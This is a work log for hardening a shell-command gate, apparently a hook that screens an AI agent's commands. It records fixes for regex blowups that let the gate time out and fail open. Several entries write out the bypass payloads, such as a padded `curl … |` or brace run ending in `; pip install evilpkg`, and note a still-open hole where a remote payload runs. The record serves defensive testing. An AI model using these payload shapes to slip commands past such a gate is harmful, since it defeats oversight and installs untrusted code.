  { x20000       20,047 B   22.9029 s -> 3.4078 s    STILL QUADRATIC
  { x81872       81,919 B  391.1999 s -> 56.2891 s   6.2% margin, not headroom
```

**IT IS NOT PARETO**: the brace axis is 1.02× of the parent after commit 1, and
the non-overlapping control `2>x/foo `×2700 goes 0.0304 → 0.0368 s. The shell's
cost is unchanged on all three axes.

**THE FIX LOOP DIVERGED AND THE OPERATOR STRIPPED IT** — 20 → 22 findings at
step 8, E2. The stripped commit had done two things, subtracted step-7's record
defects **and** added two guards, and six of the ten MAJOR/BLOCKER findings were
on the additions; the strip kept the subtractions and dropped the additions. Two
further rounds went 10 → 10 and the loop was stopped rather than run to its
bound. **32 of 32 agents completed across the five review fan-outs, 0 errors**, after
a sixth attempt — the first run of the step-3 review — lost 5 of 5 to a
transient `529` and was re-run with a retry wrapper.

**THE VERDICT DID NOT MOVE** — `docs/production-readiness.md` is untouched; this
item is not one of its two remaining legs. Residual filed:
`prefix-run-language-guard` (A, the three things PR #92 proved it needed and did
not ship). **Ten findings were open at merge and are posted on the PR**, not
papered over: step 9a's "0 confirmed findings" criterion was UNMET and the
merge was an explicit operator ruling with that stated.


**`prefix-run-cost-residuals-2` PR #87 `96cc730` — `_ckey`'s glue strip stops
rebuilding the word.** Closed 2026-08-22. **THE ITEM SHIPPED HALF OF WHAT IT
PLANNED, ON AN OPERATOR RULING, AND THE HALF IT DROPPED IS THE MORE USEFUL
RECORD.** What landed is shell-only: `_ckey` took leading `COMPLETER_GLUE` off a
word one character at a time with `_t="${_t#?}"`, each of which rebuilds the
whole remainder, so stripping n glue bytes cost O(n^2); `%%` now takes the glue
run in one expansion and the remainder is taken by OFFSET, plus the X-45 guard
on `${1##*/}`. **The emitted `gates.py` is BYTE-IDENTICAL to the parent** — one
hook body moves, `.claude/hooks/dependency-gate.sh`, plus the two files that
digest it. Measured on the emitted hooks, min of 2, both trees in one run:
`?`×16000 **4.871 → 0.323 s**; a glued brace run at 81,919 B **131.196 →
16.431 s**; `{`×81870 + `; pip install evilpkg` **120.588 → 6.149 s**. **The
last two were live fail-opens on this substrate**, both past the 60 s ceiling
the emitted `settings.json` declares, and the second is PR #84's own filed
payload — the row this file called the highest-severity in it that is not X-37.
**It is a constant-factor win, NOT an order change**: landed exponents
1.05 / 1.40 / 1.68 against `main`'s 1.80 / 1.98 / 1.95, because
`${_t%%[!({:?]*}` is itself quadratic. Behaviour unchanged and checked — 196
alphabet cases across the three `_ckey` spellings, 0 disagreements, and the
emitted body agrees with `cmdpos.completer_key` on every glue form in the
`#45 D1` census. Freeze exception **74**, recorded in `docs/changelog.md` and
written 3× in `test_greenfield_golden.py` and 1× in `test_retrofit.py`, matching
nos. 72 and 73. Suite **9,810 → 9,811** — one row, a cost row, RED on `main` at
5.01 s against its 3.0 s bound. Action counts unchanged at 57/69/59 and 79/93.
**THE LEFT-EDGE NARROWING WAS DROPPED AND IS NOT COMING BACK CHEAPLY.** The
four refuted left-edge spellings (factoring the suffix 1.27-1.35x;
disjoint-by-first-character 1.10x; a zero-width lookahead 1.05x, still over at
62.7-65.0 s on the crossing payload; a one-alternative narrowing 1.14x) were
carried by `prefix-run-assignment-wrapper-overlap`, **closed 2026-08-25, PR #92
`abe3f48`** -- repeated here so the pointer does not dangle, and the left edge
itself LANDED in that item. **THE VERDICT DID NOT MOVE.**


**`prefix-run-cost-residuals` PR #84 `3ea405a` — three self-ambiguous arms lose
their duplicate parses.** Closed 2026-08-21. A backtracking engine walks every
parse before it can report a FAILING match, so the cost was the number of
parses, not the length of the input. `HEAD` + `2>>o `×24 is **141 bytes with
zero jump bytes** and cost the SDK **110.22 s CPU** against a gate declaring
60 s; it is now 0.000 s. Language equivalence PROVED by ERE/Python → NFA →
product-BFS deciders in both dialects, unbounded in length, two-sided
calibrated. Freeze exception **73**. Suite **9,763 → 9,810**; differential
4,178 → **4,220**; composition 147 → **152**; golden 13/0 and retrofit 271/0
unchanged. Verified on `main` after merge, not on the branch.
**IT HALTED AT E7 FOR A DAY OVER AN UNRELATED CHECK** — `#50 T8`, deleted by
`t8-ratio-bound` below — and the branch was updated by MERGE rather than rebase,
because an intermediate commit tracks the ten files `git add -A` swept in and
replaying it would have deleted the operator's untracked working files.
**THE VERDICT DID NOT MOVE.** Residuals: `prefix-run-cost-residuals-2` (A) —
and the glued-brace length axis in it is a live fail-open on both substrates at
81,891 bytes, which is not a regression and is not closed.

**`t8-ratio-bound` PR #85 `827a19e` — a 1.02x-margin clock deleted, and the
shell twin's clamp pinned.** Closed 2026-08-21. `#50 T8` bounded a LINEAR
reduction (measured log-log exponent 0.9951) at exactly its linear ratio: 8x the
input, a `< 8x` bound, and a margin made entirely of 0.203 µs of fixed per-call
overhead against 11.432 µs of scan. Over five runs of 20,000 trials the median
ratio is **7.841 in all five** and the p95 is **8.002–8.040, over the bound in
every run**; the violation RATE is not a stable statistic (5.1–7.2% here,
2.0–16.1% for a reviewer) and that spread is the defect. **It was 6 of the 14
CI failures this repository has ever had, across 7 attempts, the only red check
in all six, once on `main`.** Net: two files, +70/−14, no product code, no
digest; suite 9,763 → **9,763**, one row deleted and one added.
**THE RUNBOOK LINE WENT WITH IT** — §3 step 9a told every session to tolerate a
red on that row, which is the sentence that took #84 to E7.
**IT HIT E2 TWICE, BOTH TIMES IN PROSE, NEVER IN CODE.** Residuals:
`int-word-clamp-sufficiency` (A) and `sdk-template-basen-comment` (B).

**`sdk-pipe-trigger-redos` PR #81 `897d427` — the SDK prefix-run ReDoS, and a
fix loop that DIVERGED and was stripped rather than continued.** `prefix_run()`
was a star whose wrapper arm was ambiguous with itself, so a FAILING match was
exponential: `curl … | ` + `env `×22 + `zzz ; pip install evilpkg` is **134 bytes
with zero jump bytes** and cost the emitted `dependency-gate` **77.56 s CPU**
against the 60 s it declares — a cancelled hook exits 124/137/143 and only exit 2
blocks, so the command proceeded unadjudicated while the shell denied it in
0.03 s. `_cost_guard` measures length and jump density and could see neither
term. Fixed by allowing **at most one absorbing arm**. Suite 9,729 → **9,763**;
differential 4,161 → **4,178**; composition 130 → **147**. Freeze exception
**72**, five digests, action counts unchanged at 57/69/59 and 79/93.

**THE LANGUAGE IS UNCHANGED AND THAT IS DECIDED, NOT SAMPLED** — an exact
ERE→NFA→product-BFS equivalence procedure explored the full product graph in
BOTH dialects with zero accept-disagreements, two-sided calibrated against
deliberately broken variants, corroborated by three engines and 648 real command
shapes through both emitted substrates of both trees. Post-merge I ran the
security KB's own release check: **the full 17,268-case corpus through both
trees, previously-denied-now-allowed = 0**, and zero changes in the other
direction too — which also confirms the corpus is blind to this class, so that
result is evidence of NO REGRESSION and is **not** evidence the fix works. The
four cost rows are that evidence.

**THE PART WORTH REMEMBERING IS THE FAILURE.** Step 7 returned 12 findings; the
commit fixing them returned **16**, six about claims that commit introduced. The
item halted at **E2** and the operator directed a strip to the mechanically
verified core. **Every defect in both rounds was in PROSE** — the regex had a
decider, the gates 9,763 assertions, the digests pins; the claims had nothing.
**Two backlog rows were mislabelled `shell-DENY / SDK-BYPASS` when their payloads
measure allow/allow**, both overstating severity, because nobody ran the payload
through both substrates and read the exit codes.

**THE VERDICT DID NOT MOVE** and `docs/production-readiness.md` is untouched by
design: it does not rest on this item (0 mentions), and a fail-open that shrinks
from 134 bytes to ~2 KB is still a fail-open. **The cost class is NOT closed** —
the token-count axis is. Residuals filed as `prefix-run-cost-residuals` (A) and
`prefix-run-record-layer` (C). **One known defect shipped and is disclosed:** this
change makes the `#43 F1` rationale stale in four files, two of them emitted
bytes; it is the first row of `prefix-run-record-layer`.


**`b1b-fence-pins` PR #79 `88b2c42` — the item-1b false-positive fence, which
did not exist.** Every pinned row in the repo putting a command or process
substitution at an EXECUTION position was one of the six Class-B KNOWN-OPEN rows
X-37 exists to FLIP to `deny`; nothing asserted such a substitution may still be
ALLOWED, so a rule keyed on position alone was invisible to the corpus. 45 rows
in four behaviourally-derived groups (`_B1B_FENCE_EXEC` 26 / `_B1B_FENCE_PATH` 4
/ `_B1B_FENCE_DATA` 8 / `_B1B_FENCE_DL` 7) + 12 contract checks. Suite
9,672 -> 9,729; differential 4,104 -> 4,161. No `lib/` change, no rule, no
digest movement, **no freeze exception**. **X-37 is NOT advanced** — this makes
the next attempt falsifiable. Merged by the loop on explicit operator direction
in-session (9b carve-out; the operator was on remote control and could not
reach `gh`).

**`c1-license` PR #75 `de13e71` — readiness C-1 CLOSED, Apache-2.0; the first
finding this cycle FIXED rather than re-measured** · `x54-headclass-measurement`
PR #70 `9450b7d` (exc. 69) · `prd-filename-v280`
PR #72 `54ebc4b` (exc. 70) · ledger entries 27/28 PRs #69 `f9c2bb2`, #71
`03dd309` · post-v2.8.0 record PR #68 `6143427` · **the harness itself**
(runbook + this queue + `context-check.py`) PR #73 `358ac9b`, **merged by the
operator — the first merge in this run the loop did not perform itself**, which
is exactly what 9b now requires.

## Owed

**[2026-08-25]** `prefix-run-assignment-wrapper-overlap` closed, PR #92
merge `abe3f48`. **THE VERDICT DID NOT MOVE** -- it is neither of the two
remaining legs (X-37 Class B; C-2 autonomous dispatch), both still standing.
A holds **8**: one row left for Done and `prefix-run-language-guard` was filed
in its place. **`docs/production-readiness.md` is now 70 commits behind its
last edit (`5a570ec`, 2026-08-14) and no row covers that** -- `priority-reading`
(C) owns only its stale Snapshot header. Left deliberately: C-tier work while
six A rows are ready.

*(Nothing. The PR #72 ledger entry that was owed here is discharged as entry
29; the harness work is entry 30. Ledger at 30, pin moved in the same commit.)*

**Verdict status, so the scoreboard is not lost between sessions:**
`docs/production-readiness.md` §1 still reads **NOT PRODUCTION READY** — and
that is the correct outcome, not a failure of the item. **C-1 is CLOSED** (PR
#75, `de13e71`): the first readiness finding this cycle to be *fixed* rather
than re-measured, and `git ls-files | grep -icE 'licen[cs]e'` now returns 1.
§1 rests on **three** negative legs and one is gone. Still standing:
**X-37** (Class B — a remote payload still runs) and **C-2** (the autonomous
wrappers dispatch nothing). *"C-1 alone settles it either way"* meant
independently sufficient, never sole ground.

**[2026-08-22] `prefix-run-cost-residuals-2` is CLOSED** (PR #87, merge
`96cc730`) and **THE VERDICT DID NOT MOVE**: `docs/production-readiness.md` §1
still reads **NOT PRODUCTION READY** on the same two legs, **X-37** and **C-2**,
neither of which this item touches. It closed two live SHELL fail-opens and left
the SDK's own glued-brace axis open, filed above.

**[CORRECTED 2026-08-22, and the correction is the point.** The sentence that
stood here said *"A now holds FIVE rows"* and named five. **A holds EIGHT**, and
the five it named omitted `pipe-run-glued-pipe-axis`,
`jump-bytes-emission-divergence` and `int-word-clamp-sufficiency`, which were all
in A when it was written. `shell-walk-residual-superlinear` was ALSO in A while
PR #88's own body tiers it **B**; it has been moved to B, which is why the count
is eight and not nine. **A count asserted from the rows I had just added rather
than read off the file** — the same error this item was graded `harmful` for,
committed in the commit that closed it. Counts below are derived from the
section headers, not from memory.**]

**A holds 8** — `c2-autonomous-dispatch` (blocked on a decision),
`prefix-run-assignment-wrapper-overlap` (**take this before any left-edge
work**), `pipe-rule-url-pipe-cubic` (the operator's committed next item),
`install-tail-path-scan-quadratic`, `pipe-run-glued-pipe-axis`,
`jump-bytes-emission-divergence`, `int-word-clamp-sufficiency` and
`x37-class-b`. **B holds 6**, `shell-walk-residual-superlinear` among them.

**[2026-08-23] SUPERSEDED, NOT WRONG WHEN WRITTEN.**
`pipe-rule-url-pipe-cubic` was worked to step 4 and **shipped no fix**; it stays
in A, unfixed. Three residuals it exposed were filed in **B** and one in
**Measurement residuals**. **Counted off the section headers just now, not from
memory: A = 8, B = 9, C = 5, measurement residuals = 3.** The new B rows are
`cost-guard-raw-string-soundness`, `run-length-substrate-whitespace-split` and
`downloader-arrival-shapes-unpinned`; the new measurement row is
`benign-corpus-reconciliation`.

**[2026-08-20] `sdk-pipe-trigger-redos` is CLOSED** (PR #81, merge `897d427`;
closeout #82) and the paragraph that used to stand here — *"the next item is
`sdk-pipe-trigger-redos`, not `x37-class-b`"*, and *"`x37-class-b` is the only
remaining A-tier row"* — is superseded rather than deleted, because both were
true when written. **A now holds THREE rows**: `c2-autonomous-dispatch`
(blocked on a decision), `prefix-run-cost-residuals` and `x37-class-b`.

**[2026-08-21] `prefix-run-cost-residuals` is CLOSED** (PR #84, merge
`3ea405a`), together with `t8-ratio-bound` (PR #85, merge `827a19e`) — see Done.
**A now holds FOUR rows**: `c2-autonomous-dispatch` (blocked on a decision),
`prefix-run-cost-residuals-2`, `int-word-clamp-sufficiency` and `x37-class-b`.
**X-37 remains the only A-tier row that moves the verdict**, and it is
unchanged: neither closed item touched it or C-2, so
`docs/production-readiness.md` §1 still reads **not production ready**.
**AND THE SCOREBOARD IS BLOCKED ON A DECISION, NOT ON WORK:** of the verdict's
two remaining legs, X-37 has a work order and C-2 has only a question. Clearing
every buildable row in A would still leave §1 at *not production ready*.
**`x37-class-b`** stays ready and now has a fence under it (PR #79).

**On `x37-class-b`:** It is the only remaining A-tier
row, it is `CODE`, and it gets full ceremony. **Attempt 1 (2026-08-14) was
built, measured and WITHDRAWN as a net security regression — see the entry above
and the X-37 row. Nothing about the verdict changed, and X-37 is still `open`.**
The lesson the next session should not have to rediscover: a verdict corpus of
4,163 rows was fully green over a rule that was bypassable by one nested `$()`
and that turned existing denies into allows under padding. **A green corpus
proves the corpus did not move, not that the gate is sound** — the third time
this repo has logged that shape.
